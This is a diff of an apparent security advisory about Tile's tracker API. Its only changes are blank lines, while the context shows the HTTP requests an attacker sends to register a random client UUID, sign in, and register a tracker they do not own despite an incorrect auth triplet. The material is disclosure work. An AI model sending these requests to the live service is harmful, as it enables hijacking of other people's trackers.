@@ -28,6 +28,7 @@ For the attacker to exploit this vulnerability, they must have knowledge about t
 
 Before registering a tracker to their account, the attacker needs a valid client UUID and use it to sign in to their account.
 The attacker can create a valid client UUID by generating a random UUID and registering it with Tile by sending the following request:
+
 ```http
 PUT https://production.tile-api.com/api/v1/clients/c7394030-5b88-44a2-b1be-704b730b07c7 HTTP/2.0
 tile_client_uuid: c7394030-5b88-44a2-b1be-704b730b07c7
@@ -38,6 +39,7 @@ registration_timestamp=1720090702959&app_id=android-tile-production&app_version=
 ```
 
 Afterwards, they can sign in to their account with the following request:
+
 ```http
 POST https://production.tile-api.com/api/v1/clients/c7394030-5b88-44a2-b1be-704b730b07c7/sessions HTTP/2.0
 tile_client_uuid: c7394030-5b88-44a2-b1be-704b730b07c7
@@ -74,6 +76,7 @@ Content-Disposition: form-data; name="sres_t"
 CCCCCC==
 --BOUNDARY--
 ```
+
 _In the request, every instance of `:tileUUID` must be replaced with the Tile UUID of a tracker that is not registered to an account._
 
 In the request above, the auth triplet is incorrect.
